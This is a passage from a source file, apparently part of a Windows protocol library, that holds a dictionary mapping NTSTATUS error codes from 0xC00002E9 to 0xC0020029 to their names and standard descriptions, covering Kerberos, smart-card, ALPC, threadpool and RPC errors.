		0xC00002E9: ("STATUS_CURRENT_DOMAIN_NOT_ALLOWED","This operation cannot be performed on the current domain."),
		0xC00002EA: ("STATUS_CANNOT_MAKE","The directory or file cannot be created."),
		0xC00002EB: ("STATUS_SYSTEM_SHUTDOWN","The system is in the process of shutting down."),
		0xC00002EC: ("STATUS_DS_INIT_FAILURE_CONSOLE","Directory Services could not start because of the following error: %hs Error Status: 0x%x. Click OK to shut down the system. You can use the recovery console to diagnose the system further."),
		0xC00002ED: ("STATUS_DS_SAM_INIT_FAILURE_CONSOLE","Security Accounts Manager initialization failed because of the following error: %hs Error Status: 0x%x. Click OK to shut down the system. You can use the recovery console to diagnose the system further."),
		0xC00002EE: ("STATUS_UNFINISHED_CONTEXT_DELETED","A security context was deleted before the context was completed. This is considered a logon failure."),
		0xC00002EF: ("STATUS_NO_TGT_REPLY","The client is trying to negotiate a context and the server requires user-to-user but did not send a TGT reply."),
		0xC00002F0: ("STATUS_OBJECTID_NOT_FOUND","An object ID was not found in the file."),
		0xC00002F1: ("STATUS_NO_IP_ADDRESSES","Unable to accomplish the requested task because the local machine does not have any IP addresses."),
		0xC00002F2: ("STATUS_WRONG_CREDENTIAL_HANDLE","The supplied credential handle does not match the credential that is associated with the security context."),
		0xC00002F3: ("STATUS_CRYPTO_SYSTEM_INVALID","The crypto system or checksum function is invalid because a required function is unavailable."),
		0xC00002F4: ("STATUS_MAX_REFERRALS_EXCEEDED","The number of maximum ticket referrals has been exceeded."),
		0xC00002F5: ("STATUS_MUST_BE_KDC","The local machine must be a Kerberos KDC (domain controller) and it is not."),
		0xC00002F6: ("STATUS_STRONG_CRYPTO_NOT_SUPPORTED","The other end of the security negotiation requires strong crypto but it is not supported on the local machine."),
		0xC00002F7: ("STATUS_TOO_MANY_PRINCIPALS","The KDC reply contained more than one principal name."),
		0xC00002F8: ("STATUS_NO_PA_DATA","Expected to find PA data for a hint of what etype to use, but it was not found."),
		0xC00002F9: ("STATUS_PKINIT_NAME_MISMATCH","The client certificate does not contain a valid UPN, or does not match the client name in the logon request. Contact your administrator."),
		0xC00002FA: ("STATUS_SMARTCARD_LOGON_REQUIRED","Smart card logon is required and was not used."),
		0xC00002FB: ("STATUS_KDC_INVALID_REQUEST","An invalid request was sent to the KDC."),
		0xC00002FC: ("STATUS_KDC_UNABLE_TO_REFER","The KDC was unable to generate a referral for the service requested."),
		0xC00002FD: ("STATUS_KDC_UNKNOWN_ETYPE","The encryption type requested is not supported by the KDC."),
		0xC00002FE: ("STATUS_SHUTDOWN_IN_PROGRESS","A system shutdown is in progress."),
		0xC00002FF: ("STATUS_SERVER_SHUTDOWN_IN_PROGRESS","The server machine is shutting down."),
		0xC0000300: ("STATUS_NOT_SUPPORTED_ON_SBS","This operation is not supported on a computer running Windows Server 2003 for Small Business Server."),
		0xC0000301: ("STATUS_WMI_GUID_DISCONNECTED","The WMI GUID is no longer available."),
		0xC0000302: ("STATUS_WMI_ALREADY_DISABLED","Collection or events for the WMI GUID is already disabled."),
		0xC0000303: ("STATUS_WMI_ALREADY_ENABLED","Collection or events for the WMI GUID is already enabled."),
		0xC0000304: ("STATUS_MFT_TOO_FRAGMENTED","The master file table on the volume is too fragmented to complete this operation."),
		0xC0000305: ("STATUS_COPY_PROTECTION_FAILURE","Copy protection failure."),
		0xC0000306: ("STATUS_CSS_AUTHENTICATION_FAILURE","Copy protection error-DVD CSS Authentication failed."),
		0xC0000307: ("STATUS_CSS_KEY_NOT_PRESENT","Copy protection error-The specified sector does not contain a valid key."),
		0xC0000308: ("STATUS_CSS_KEY_NOT_ESTABLISHED","Copy protection error-DVD session key not established."),
		0xC0000309: ("STATUS_CSS_SCRAMBLED_SECTOR","Copy protection error-The read failed because the sector is encrypted."),
		0xC000030A: ("STATUS_CSS_REGION_MISMATCH","Copy protection error-The region of the specified DVD does not correspond to the region setting of the drive."),
		0xC000030B: ("STATUS_CSS_RESETS_EXHAUSTED","Copy protection error-The region setting of the drive may be permanent."),
		0xC0000320: ("STATUS_PKINIT_FAILURE","The Kerberos protocol encountered an error while validating the KDC certificate during smart card logon. There is more information in the system event log."),
		0xC0000321: ("STATUS_SMARTCARD_SUBSYSTEM_FAILURE","The Kerberos protocol encountered an error while attempting to use the smart card subsystem."),
		0xC0000322: ("STATUS_NO_KERB_KEY","The target server does not have acceptable Kerberos credentials."),
		0xC0000350: ("STATUS_HOST_DOWN","The transport determined that the remote system is down."),
		0xC0000351: ("STATUS_UNSUPPORTED_PREAUTH","An unsupported pre-authentication mechanism was presented to the Kerberos package."),
		0xC0000352: ("STATUS_EFS_ALG_BLOB_TOO_BIG","The encryption algorithm that is used on the source file needs a bigger key buffer than the one that is used on the destination file."),
		0xC0000353: ("STATUS_PORT_NOT_SET","An attempt to remove a processes DebugPort was made, but a port was not already associated with the process."),
		0xC0000354: ("STATUS_DEBUGGER_INACTIVE","An attempt to do an operation on a debug port failed because the port is in the process of being deleted."),
		0xC0000355: ("STATUS_DS_VERSION_CHECK_FAILURE","This version of Windows is not compatible with the behavior version of the directory forest, domain, or domain controller."),
		0xC0000356: ("STATUS_AUDITING_DISABLED","The specified event is currently not being audited."),
		0xC0000357: ("STATUS_PRENT4_MACHINE_ACCOUNT","The machine account was created prior to Windows NT 4.0. The account needs to be recreated."),
		0xC0000358: ("STATUS_DS_AG_CANT_HAVE_UNIVERSAL_MEMBER","An account group cannot have a universal group as a member."),
		0xC0000359: ("STATUS_INVALID_IMAGE_WIN_32","The specified image file did not have the correct format; it appears to be a 32-bit Windows image."),
		0xC000035A: ("STATUS_INVALID_IMAGE_WIN_64","The specified image file did not have the correct format; it appears to be a 64-bit Windows image."),
		0xC000035B: ("STATUS_BAD_BINDINGS","The client's supplied SSPI channel bindings were incorrect."),
		0xC000035C: ("STATUS_NETWORK_SESSION_EXPIRED","The client session has expired; so the client must re-authenticate to continue accessing the remote resources."),
		0xC000035D: ("STATUS_APPHELP_BLOCK","The AppHelp dialog box canceled; thus preventing the application from starting."),
		0xC000035E: ("STATUS_ALL_SIDS_FILTERED","The SID filtering operation removed all SIDs."),
		0xC000035F: ("STATUS_NOT_SAFE_MODE_DRIVER","The driver was not loaded because the system is starting in safe mode."),
		0xC0000361: ("STATUS_ACCESS_DISABLED_BY_POLICY_DEFAULT","Access to %1 has been restricted by your Administrator by the default software restriction policy level."),
		0xC0000362: ("STATUS_ACCESS_DISABLED_BY_POLICY_PATH","Access to %1 has been restricted by your Administrator by location with policy rule %2 placed on path %3."),
		0xC0000363: ("STATUS_ACCESS_DISABLED_BY_POLICY_PUBLISHER","Access to %1 has been restricted by your Administrator by software publisher policy."),
		0xC0000364: ("STATUS_ACCESS_DISABLED_BY_POLICY_OTHER","Access to %1 has been restricted by your Administrator by policy rule %2."),
		0xC0000365: ("STATUS_FAILED_DRIVER_ENTRY","The driver was not loaded because it failed its initialization call."),
		0xC0000366: ("STATUS_DEVICE_ENUMERATION_ERROR","The device encountered an error while applying power or reading the device configuration. This may be caused by a failure of your hardware or by a poor connection."),
		0xC0000368: ("STATUS_MOUNT_POINT_NOT_RESOLVED","The create operation failed because the name contained at least one mount point that resolves to a volume to which the specified device object is not attached."),
		0xC0000369: ("STATUS_INVALID_DEVICE_OBJECT_PARAMETER","The device object parameter is either not a valid device object or is not attached to the volume that is specified by the file name."),
		0xC000036A: ("STATUS_MCA_OCCURED","A machine check error has occurred. Check the system event log for additional information."),
		0xC000036B: ("STATUS_DRIVER_BLOCKED_CRITICAL","Driver %2 has been blocked from loading."),
		0xC000036C: ("STATUS_DRIVER_BLOCKED","Driver %2 has been blocked from loading."),
		0xC000036D: ("STATUS_DRIVER_DATABASE_ERROR","There was error [%2] processing the driver database."),
		0xC000036E: ("STATUS_SYSTEM_HIVE_TOO_LARGE","System hive size has exceeded its limit."),
		0xC000036F: ("STATUS_INVALID_IMPORT_OF_NON_DLL","A dynamic link library (DLL) referenced a module that was neither a DLL nor the process's executable image."),
		0xC0000371: ("STATUS_NO_SECRETS","The local account store does not contain secret material for the specified account."),
		0xC0000372: ("STATUS_ACCESS_DISABLED_NO_SAFER_UI_BY_POLICY","Access to %1 has been restricted by your Administrator by policy rule %2."),
		0xC0000373: ("STATUS_FAILED_STACK_SWITCH","The system was not able to allocate enough memory to perform a stack switch."),
		0xC0000374: ("STATUS_HEAP_CORRUPTION","A heap has been corrupted."),
		0xC0000380: ("STATUS_SMARTCARD_WRONG_PIN","An incorrect PIN was presented to the smart card."),
		0xC0000381: ("STATUS_SMARTCARD_CARD_BLOCKED","The smart card is blocked."),
		0xC0000382: ("STATUS_SMARTCARD_CARD_NOT_AUTHENTICATED","No PIN was presented to the smart card."),
		0xC0000383: ("STATUS_SMARTCARD_NO_CARD","No smart card is available."),
		0xC0000384: ("STATUS_SMARTCARD_NO_KEY_CONTAINER","The requested key container does not exist on the smart card."),
		0xC0000385: ("STATUS_SMARTCARD_NO_CERTIFICATE","The requested certificate does not exist on the smart card."),
		0xC0000386: ("STATUS_SMARTCARD_NO_KEYSET","The requested keyset does not exist."),
		0xC0000387: ("STATUS_SMARTCARD_IO_ERROR","A communication error with the smart card has been detected."),
		0xC0000388: ("STATUS_DOWNGRADE_DETECTED","The system detected a possible attempt to compromise security. Ensure that you can contact the server that authenticated you."),
		0xC0000389: ("STATUS_SMARTCARD_CERT_REVOKED","The smart card certificate used for authentication has been revoked. Contact your system administrator. There may be additional information in the event log."),
		0xC000038A: ("STATUS_ISSUING_CA_UNTRUSTED","An untrusted certificate authority was detected while processing the smart card certificate that is used for authentication. Contact your system administrator."),
		0xC000038B: ("STATUS_REVOCATION_OFFLINE_C","The revocation status of the smart card certificate that is used for authentication could not be determined. Contact your system administrator."),
		0xC000038C: ("STATUS_PKINIT_CLIENT_FAILURE","The smart card certificate used for authentication was not trusted. Contact your system administrator."),
		0xC000038D: ("STATUS_SMARTCARD_CERT_EXPIRED","The smart card certificate used for authentication has expired. Contact your system administrator."),
		0xC000038E: ("STATUS_DRIVER_FAILED_PRIOR_UNLOAD","The driver could not be loaded because a previous version of the driver is still in memory."),
		0xC000038F: ("STATUS_SMARTCARD_SILENT_CONTEXT","The smart card provider could not perform the action because the context was acquired as silent."),
		0xC0000401: ("STATUS_PER_USER_TRUST_QUOTA_EXCEEDED","The delegated trust creation quota of the current user has been exceeded."),
		0xC0000402: ("STATUS_ALL_USER_TRUST_QUOTA_EXCEEDED","The total delegated trust creation quota has been exceeded."),
		0xC0000403: ("STATUS_USER_DELETE_TRUST_QUOTA_EXCEEDED","The delegated trust deletion quota of the current user has been exceeded."),
		0xC0000404: ("STATUS_DS_NAME_NOT_UNIQUE","The requested name already exists as a unique identifier."),
		0xC0000405: ("STATUS_DS_DUPLICATE_ID_FOUND","The requested object has a non-unique identifier and cannot be retrieved."),
		0xC0000406: ("STATUS_DS_GROUP_CONVERSION_ERROR","The group cannot be converted due to attribute restrictions on the requested group type."),
		0xC0000407: ("STATUS_VOLSNAP_PREPARE_HIBERNATE","{Volume Shadow Copy Service} Wait while the Volume Shadow Copy Service prepares volume %hs for hibernation."),
		0xC0000408: ("STATUS_USER2USER_REQUIRED","Kerberos sub-protocol User2User is required."),
		0xC0000409: ("STATUS_STACK_BUFFER_OVERRUN","The system detected an overrun of a stack-based buffer in this application. This overrun could potentially allow a malicious user to gain control of this application."),
		0xC000040A: ("STATUS_NO_S4U_PROT_SUPPORT","The Kerberos subsystem encountered an error. A service for user protocol request was made against a domain controller which does not support service for user."),
		0xC000040B: ("STATUS_CROSSREALM_DELEGATION_FAILURE","An attempt was made by this server to make a Kerberos constrained delegation request for a target that is outside the server realm. This action is not supported and the resulting error indicates a misconfiguration on the allowed-to-delegate-to list for this server. Contact your administrator."),
		0xC000040C: ("STATUS_REVOCATION_OFFLINE_KDC","The revocation status of the domain controller certificate used for smart card authentication could not be determined. There is additional information in the system event log. Contact your system administrator."),
		0xC000040D: ("STATUS_ISSUING_CA_UNTRUSTED_KDC","An untrusted certificate authority was detected while processing the domain controller certificate used for authentication. There is additional information in the system event log. Contact your system administrator."),
		0xC000040E: ("STATUS_KDC_CERT_EXPIRED","The domain controller certificate used for smart card logon has expired. Contact your system administrator with the contents of your system event log."),
		0xC000040F: ("STATUS_KDC_CERT_REVOKED","The domain controller certificate used for smart card logon has been revoked. Contact your system administrator with the contents of your system event log."),
		0xC0000410: ("STATUS_PARAMETER_QUOTA_EXCEEDED","Data present in one of the parameters is more than the function can operate on."),
		0xC0000411: ("STATUS_HIBERNATION_FAILURE","The system has failed to hibernate (The error code is %hs). Hibernation will be disabled until the system is restarted."),
		0xC0000412: ("STATUS_DELAY_LOAD_FAILED","An attempt to delay-load a .dll or get a function address in a delay-loaded .dll failed."),
		0xC0000413: ("STATUS_AUTHENTICATION_FIREWALL_FAILED","Logon Failure: The machine you are logging onto is protected by an authentication firewall. The specified account is not allowed to authenticate to the machine."),
		0xC0000414: ("STATUS_VDM_DISALLOWED","%hs is a 16-bit application. You do not have permissions to execute 16-bit applications. Check your permissions with your system administrator."),
		0xC0000415: ("STATUS_HUNG_DISPLAY_DRIVER_THREAD","{Display Driver Stopped Responding} The %hs display driver has stopped working normally. Save your work and reboot the system to restore full display functionality. The next time you reboot the machine a dialog will be displayed giving you a chance to report this failure to Microsoft."),
		0xC0000416: ("STATUS_INSUFFICIENT_RESOURCE_FOR_SPECIFIED_SHARED_SECTION_SIZE","The Desktop heap encountered an error while allocating session memory. There is more information in the system event log."),
		0xC0000417: ("STATUS_INVALID_CRUNTIME_PARAMETER","An invalid parameter was passed to a C runtime function."),
		0xC0000418: ("STATUS_NTLM_BLOCKED","The authentication failed because NTLM was blocked."),
		0xC0000419: ("STATUS_DS_SRC_SID_EXISTS_IN_FOREST","The source object's SID already exists in destination forest."),
		0xC000041A: ("STATUS_DS_DOMAIN_NAME_EXISTS_IN_FOREST","The domain name of the trusted domain already exists in the forest."),
		0xC000041B: ("STATUS_DS_FLAT_NAME_EXISTS_IN_FOREST","The flat name of the trusted domain already exists in the forest."),
		0xC000041C: ("STATUS_INVALID_USER_PRINCIPAL_NAME","The User Principal Name (UPN) is invalid."),
		0xC0000420: ("STATUS_ASSERTION_FAILURE","There has been an assertion failure."),
		0xC0000421: ("STATUS_VERIFIER_STOP","Application verifier has found an error in the current process."),
		0xC0000423: ("STATUS_CALLBACK_POP_STACK","A user mode unwind is in progress."),
		0xC0000424: ("STATUS_INCOMPATIBLE_DRIVER_BLOCKED","%2 has been blocked from loading due to incompatibility with this system. Contact your software vendor for a compatible version of the driver."),
		0xC0000425: ("STATUS_HIVE_UNLOADED","Illegal operation attempted on a registry key which has already been unloaded."),
		0xC0000426: ("STATUS_COMPRESSION_DISABLED","Compression is disabled for this volume."),
		0xC0000427: ("STATUS_FILE_SYSTEM_LIMITATION","The requested operation could not be completed due to a file system limitation."),
		0xC0000428: ("STATUS_INVALID_IMAGE_HASH","The hash for image %hs cannot be found in the system catalogs. The image is likely corrupt or the victim of tampering."),
		0xC0000429: ("STATUS_NOT_CAPABLE","The implementation is not capable of performing the request."),
		0xC000042A: ("STATUS_REQUEST_OUT_OF_SEQUENCE","The requested operation is out of order with respect to other operations."),
		0xC000042B: ("STATUS_IMPLEMENTATION_LIMIT","An operation attempted to exceed an implementation-defined limit."),
		0xC000042C: ("STATUS_ELEVATION_REQUIRED","The requested operation requires elevation."),
		0xC000042D: ("STATUS_NO_SECURITY_CONTEXT","The required security context does not exist."),
		0xC000042E: ("STATUS_PKU2U_CERT_FAILURE","The PKU2U protocol encountered an error while attempting to utilize the associated certificates."),
		0xC0000432: ("STATUS_BEYOND_VDL","The operation was attempted beyond the valid data length of the file."),
		0xC0000433: ("STATUS_ENCOUNTERED_WRITE_IN_PROGRESS","The attempted write operation encountered a write already in progress for some portion of the range."),
		0xC0000434: ("STATUS_PTE_CHANGED","The page fault mappings changed in the middle of processing a fault so the operation must be retried."),
		0xC0000435: ("STATUS_PURGE_FAILED","The attempt to purge this file from memory failed to purge some or all the data from memory."),
		0xC0000440: ("STATUS_CRED_REQUIRES_CONFIRMATION","The requested credential requires confirmation."),
		0xC0000441: ("STATUS_CS_ENCRYPTION_INVALID_SERVER_RESPONSE","The remote server sent an invalid response for a file being opened with Client Side Encryption."),
		0xC0000442: ("STATUS_CS_ENCRYPTION_UNSUPPORTED_SERVER","Client Side Encryption is not supported by the remote server even though it claims to support it."),
		0xC0000443: ("STATUS_CS_ENCRYPTION_EXISTING_ENCRYPTED_FILE","File is encrypted and should be opened in Client Side Encryption mode."),
		0xC0000444: ("STATUS_CS_ENCRYPTION_NEW_ENCRYPTED_FILE","A new encrypted file is being created and a $EFS needs to be provided."),
		0xC0000445: ("STATUS_CS_ENCRYPTION_FILE_NOT_CSE","The SMB client requested a CSE FSCTL on a non-CSE file."),
		0xC0000446: ("STATUS_INVALID_LABEL","Indicates a particular Security ID may not be assigned as the label of an object."),
		0xC0000450: ("STATUS_DRIVER_PROCESS_TERMINATED","The process hosting the driver for this device has terminated."),
		0xC0000451: ("STATUS_AMBIGUOUS_SYSTEM_DEVICE","The requested system device cannot be identified due to multiple indistinguishable devices potentially matching the identification criteria."),
		0xC0000452: ("STATUS_SYSTEM_DEVICE_NOT_FOUND","The requested system device cannot be found."),
		0xC0000453: ("STATUS_RESTART_BOOT_APPLICATION","This boot application must be restarted."),
		0xC0000454: ("STATUS_INSUFFICIENT_NVRAM_RESOURCES","Insufficient NVRAM resources exist to complete the API. A reboot might be required."),
		0xC0000500: ("STATUS_INVALID_TASK_NAME","The specified task name is invalid."),
		0xC0000501: ("STATUS_INVALID_TASK_INDEX","The specified task index is invalid."),
		0xC0000502: ("STATUS_THREAD_ALREADY_IN_TASK","The specified thread is already joining a task."),
		0xC0000503: ("STATUS_CALLBACK_BYPASS","A callback has requested to bypass native code."),
		0xC0000602: ("STATUS_FAIL_FAST_EXCEPTION","A fail fast exception occurred. Exception handlers will not be invoked and the process will be terminated immediately."),
		0xC0000603: ("STATUS_IMAGE_CERT_REVOKED","Windows cannot verify the digital signature for this file. The signing certificate for this file has been revoked."),
		0xC0000700: ("STATUS_PORT_CLOSED","The ALPC port is closed."),
		0xC0000701: ("STATUS_MESSAGE_LOST","The ALPC message requested is no longer available."),
		0xC0000702: ("STATUS_INVALID_MESSAGE","The ALPC message supplied is invalid."),
		0xC0000703: ("STATUS_REQUEST_CANCELED","The ALPC message has been canceled."),
		0xC0000704: ("STATUS_RECURSIVE_DISPATCH","Invalid recursive dispatch attempt."),
		0xC0000705: ("STATUS_LPC_RECEIVE_BUFFER_EXPECTED","No receive buffer has been supplied in a synchronous request."),
		0xC0000706: ("STATUS_LPC_INVALID_CONNECTION_USAGE","The connection port is used in an invalid context."),
		0xC0000707: ("STATUS_LPC_REQUESTS_NOT_ALLOWED","The ALPC port does not accept new request messages."),
		0xC0000708: ("STATUS_RESOURCE_IN_USE","The resource requested is already in use."),
		0xC0000709: ("STATUS_HARDWARE_MEMORY_ERROR","The hardware has reported an uncorrectable memory error."),
		0xC000070A: ("STATUS_THREADPOOL_HANDLE_EXCEPTION","Status 0x%08x was returned, waiting on handle 0x%x for wait 0x%p, in waiter 0x%p."),
		0xC000070B: ("STATUS_THREADPOOL_SET_EVENT_ON_COMPLETION_FAILED","After a callback to 0x%p(0x%p), a completion call to Set event(0x%p) failed with status 0x%08x."),
		0xC000070C: ("STATUS_THREADPOOL_RELEASE_SEMAPHORE_ON_COMPLETION_FAILED","After a callback to 0x%p(0x%p), a completion call to ReleaseSemaphore(0x%p, %d) failed with status 0x%08x."),
		0xC000070D: ("STATUS_THREADPOOL_RELEASE_MUTEX_ON_COMPLETION_FAILED","After a callback to 0x%p(0x%p), a completion call to ReleaseMutex(%p) failed with status 0x%08x."),
		0xC000070E: ("STATUS_THREADPOOL_FREE_LIBRARY_ON_COMPLETION_FAILED","After a callback to 0x%p(0x%p), a completion call to FreeLibrary(%p) failed with status 0x%08x."),
		0xC000070F: ("STATUS_THREADPOOL_RELEASED_DURING_OPERATION","The thread pool 0x%p was released while a thread was posting a callback to 0x%p(0x%p) to it."),
		0xC0000710: ("STATUS_CALLBACK_RETURNED_WHILE_IMPERSONATING","A thread pool worker thread is impersonating a client, after a callback to 0x%p(0x%p). This is unexpected, indicating that the callback is missing a call to revert the impersonation."),
		0xC0000711: ("STATUS_APC_RETURNED_WHILE_IMPERSONATING","A thread pool worker thread is impersonating a client, after executing an APC. This is unexpected, indicating that the APC is missing a call to revert the impersonation."),
		0xC0000712: ("STATUS_PROCESS_IS_PROTECTED","Either the target process, or the target thread's containing process, is a protected process."),
		0xC0000713: ("STATUS_MCA_EXCEPTION","A thread is getting dispatched with MCA EXCEPTION because of MCA."),
		0xC0000714: ("STATUS_CERTIFICATE_MAPPING_NOT_UNIQUE","The client certificate account mapping is not unique."),
		0xC0000715: ("STATUS_SYMLINK_CLASS_DISABLED","The symbolic link cannot be followed because its type is disabled."),
		0xC0000716: ("STATUS_INVALID_IDN_NORMALIZATION","Indicates that the specified string is not valid for IDN normalization."),
		0xC0000717: ("STATUS_NO_UNICODE_TRANSLATION","No mapping for the Unicode character exists in the target multi-byte code page."),
		0xC0000718: ("STATUS_ALREADY_REGISTERED","The provided callback is already registered."),
		0xC0000719: ("STATUS_CONTEXT_MISMATCH","The provided context did not match the target."),
		0xC000071A: ("STATUS_PORT_ALREADY_HAS_COMPLETION_LIST","The specified port already has a completion list."),
		0xC000071B: ("STATUS_CALLBACK_RETURNED_THREAD_PRIORITY","A threadpool worker thread entered a callback at thread base priority 0x%x and exited at priority 0x%x.  This is unexpected, indicating that the callback missed restoring the priority."),
		0xC000071C: ("STATUS_INVALID_THREAD","An invalid thread, handle %p, is specified for this operation. Possibly, a threadpool worker thread was specified."),
		0xC000071D: ("STATUS_CALLBACK_RETURNED_TRANSACTION","A threadpool worker thread entered a callback, which left transaction state.  This is unexpected, indicating that the callback missed clearing the transaction."),
		0xC000071E: ("STATUS_CALLBACK_RETURNED_LDR_LOCK","A threadpool worker thread entered a callback, which left the loader lock held.  This is unexpected, indicating that the callback missed releasing the lock."),
		0xC000071F: ("STATUS_CALLBACK_RETURNED_LANG","A threadpool worker thread entered a callback, which left with preferred languages set.  This is unexpected, indicating that the callback missed clearing them."),
		0xC0000720: ("STATUS_CALLBACK_RETURNED_PRI_BACK","A threadpool worker thread entered a callback, which left with background priorities set.  This is unexpected, indicating that the callback missed restoring the original priorities."),
		0xC0000800: ("STATUS_DISK_REPAIR_DISABLED","The attempted operation required self healing to be enabled."),
		0xC0000801: ("STATUS_DS_DOMAIN_RENAME_IN_PROGRESS","The directory service cannot perform the requested operation because a domain rename operation is in progress."),
		0xC0000802: ("STATUS_DISK_QUOTA_EXCEEDED","An operation failed because the storage quota was exceeded."),
		0xC0000804: ("STATUS_CONTENT_BLOCKED","An operation failed because the content was blocked."),
		0xC0000805: ("STATUS_BAD_CLUSTERS","The operation could not be completed due to bad clusters on disk."),
		0xC0000806: ("STATUS_VOLUME_DIRTY","The operation could not be completed because the volume is dirty. Please run the Chkdsk utility and try again."),
		0xC0000901: ("STATUS_FILE_CHECKED_OUT","This file is checked out or locked for editing by another user."),
		0xC0000902: ("STATUS_CHECKOUT_REQUIRED","The file must be checked out before saving changes."),
		0xC0000903: ("STATUS_BAD_FILE_TYPE","The file type being saved or retrieved has been blocked."),
		0xC0000904: ("STATUS_FILE_TOO_LARGE","The file size exceeds the limit allowed and cannot be saved."),
		0xC0000905: ("STATUS_FORMS_AUTH_REQUIRED","Access Denied. Before opening files in this location, you must first browse to the e.g. site and select the option to log on automatically."),
		0xC0000906: ("STATUS_VIRUS_INFECTED","The operation did not complete successfully because the file contains a virus."),
		0xC0000907: ("STATUS_VIRUS_DELETED","This file contains a virus and cannot be opened. Due to the nature of this virus, the file has been removed from this location."),
		0xC0000908: ("STATUS_BAD_MCFG_TABLE","The resources required for this device conflict with the MCFG table."),
		0xC0000909: ("STATUS_CANNOT_BREAK_OPLOCK","The operation did not complete successfully because it would cause an oplock to be broken. The caller has requested that existing oplocks not be broken."),
		0xC0009898: ("STATUS_WOW_ASSERTION","WOW Assertion Error."),
		0xC000A000: ("STATUS_INVALID_SIGNATURE","The cryptographic signature is invalid."),
		0xC000A001: ("STATUS_HMAC_NOT_SUPPORTED","The cryptographic provider does not support HMAC."),
		0xC000A010: ("STATUS_IPSEC_QUEUE_OVERFLOW","The IPsec queue overflowed."),
		0xC000A011: ("STATUS_ND_QUEUE_OVERFLOW","The neighbor discovery queue overflowed."),
		0xC000A012: ("STATUS_HOPLIMIT_EXCEEDED","An Internet Control Message Protocol (ICMP) hop limit exceeded error was received."),
		0xC000A013: ("STATUS_PROTOCOL_NOT_SUPPORTED","The protocol is not installed on the local machine."),
		0xC000A080: ("STATUS_LOST_WRITEBEHIND_DATA_NETWORK_DISCONNECTED","{Delayed Write Failed} Windows was unable to save all the data for the file %hs; the data has been lost. This error may be caused by network connectivity issues. Try to save this file elsewhere."),
		0xC000A081: ("STATUS_LOST_WRITEBEHIND_DATA_NETWORK_SERVER_ERROR","{Delayed Write Failed} Windows was unable to save all the data for the file %hs; the data has been lost. This error was returned by the server on which the file exists. Try to save this file elsewhere."),
		0xC000A082: ("STATUS_LOST_WRITEBEHIND_DATA_LOCAL_DISK_ERROR","{Delayed Write Failed} Windows was unable to save all the data for the file %hs; the data has been lost. This error may be caused if the device has been removed or the media is write-protected."),
		0xC000A083: ("STATUS_XML_PARSE_ERROR","Windows was unable to parse the requested XML data."),
		0xC000A084: ("STATUS_XMLDSIG_ERROR","An error was encountered while processing an XML digital signature."),
		0xC000A085: ("STATUS_WRONG_COMPARTMENT","This indicates that the caller made the connection request in the wrong routing compartment."),
		0xC000A086: ("STATUS_AUTHIP_FAILURE","This indicates that there was an AuthIP failure when attempting to connect to the remote host."),
		0xC000A087: ("STATUS_DS_OID_MAPPED_GROUP_CANT_HAVE_MEMBERS","OID mapped groups cannot have members."),
		0xC000A088: ("STATUS_DS_OID_NOT_FOUND","The specified OID cannot be found."),
		0xC000A100: ("STATUS_HASH_NOT_SUPPORTED","Hash generation for the specified version and hash type is not enabled on server."),
		0xC000A101: ("STATUS_HASH_NOT_PRESENT","The hash requests is not present or not up to date with the current file contents."),
		0xC0010001: ("DBG_NO_STATE_CHANGE","The debugger did not perform a state change."),
		0xC0010002: ("DBG_APP_NOT_IDLE","The debugger found that the application is not idle."),
		0xC0020001: ("RPC_NT_INVALID_STRING_BINDING","The string binding is invalid."),
		0xC0020002: ("RPC_NT_WRONG_KIND_OF_BINDING","The binding handle is not the correct type."),
		0xC0020003: ("RPC_NT_INVALID_BINDING","The binding handle is invalid."),
		0xC0020004: ("RPC_NT_PROTSEQ_NOT_SUPPORTED","The RPC protocol sequence is not supported."),
		0xC0020005: ("RPC_NT_INVALID_RPC_PROTSEQ","The RPC protocol sequence is invalid."),
		0xC0020006: ("RPC_NT_INVALID_STRING_UUID","The string UUID is invalid."),
		0xC0020007: ("RPC_NT_INVALID_ENDPOINT_FORMAT","The endpoint format is invalid."),
		0xC0020008: ("RPC_NT_INVALID_NET_ADDR","The network address is invalid."),
		0xC0020009: ("RPC_NT_NO_ENDPOINT_FOUND","No endpoint was found."),
		0xC002000A: ("RPC_NT_INVALID_TIMEOUT","The time-out value is invalid."),
		0xC002000B: ("RPC_NT_OBJECT_NOT_FOUND","The object UUID was not found."),
		0xC002000C: ("RPC_NT_ALREADY_REGISTERED","The object UUID has already been registered."),
		0xC002000D: ("RPC_NT_TYPE_ALREADY_REGISTERED","The type UUID has already been registered."),
		0xC002000E: ("RPC_NT_ALREADY_LISTENING","The RPC server is already listening."),
		0xC002000F: ("RPC_NT_NO_PROTSEQS_REGISTERED","No protocol sequences have been registered."),
		0xC0020010: ("RPC_NT_NOT_LISTENING","The RPC server is not listening."),
		0xC0020011: ("RPC_NT_UNKNOWN_MGR_TYPE","The manager type is unknown."),
		0xC0020012: ("RPC_NT_UNKNOWN_IF","The interface is unknown."),
		0xC0020013: ("RPC_NT_NO_BINDINGS","There are no bindings."),
		0xC0020014: ("RPC_NT_NO_PROTSEQS","There are no protocol sequences."),
		0xC0020015: ("RPC_NT_CANT_CREATE_ENDPOINT","The endpoint cannot be created."),
		0xC0020016: ("RPC_NT_OUT_OF_RESOURCES","Insufficient resources are available to complete this operation."),
		0xC0020017: ("RPC_NT_SERVER_UNAVAILABLE","The RPC server is unavailable."),
		0xC0020018: ("RPC_NT_SERVER_TOO_BUSY","The RPC server is too busy to complete this operation."),
		0xC0020019: ("RPC_NT_INVALID_NETWORK_OPTIONS","The network options are invalid."),
		0xC002001A: ("RPC_NT_NO_CALL_ACTIVE","No RPCs are active on this thread."),
		0xC002001B: ("RPC_NT_CALL_FAILED","The RPC failed."),
		0xC002001C: ("RPC_NT_CALL_FAILED_DNE","The RPC failed and did not execute."),
		0xC002001D: ("RPC_NT_PROTOCOL_ERROR","An RPC protocol error occurred."),
		0xC002001F: ("RPC_NT_UNSUPPORTED_TRANS_SYN","The RPC server does not support the transfer syntax."),
		0xC0020021: ("RPC_NT_UNSUPPORTED_TYPE","The type UUID is not supported."),
		0xC0020022: ("RPC_NT_INVALID_TAG","The tag is invalid."),
		0xC0020023: ("RPC_NT_INVALID_BOUND","The array bounds are invalid."),
		0xC0020024: ("RPC_NT_NO_ENTRY_NAME","The binding does not contain an entry name."),
		0xC0020025: ("RPC_NT_INVALID_NAME_SYNTAX","The name syntax is invalid."),
		0xC0020026: ("RPC_NT_UNSUPPORTED_NAME_SYNTAX","The name syntax is not supported."),
		0xC0020028: ("RPC_NT_UUID_NO_ADDRESS","No network address is available to construct a UUID."),
		0xC0020029: ("RPC_NT_DUPLICATE_ENDPOINT","The endpoint is a duplicate."),
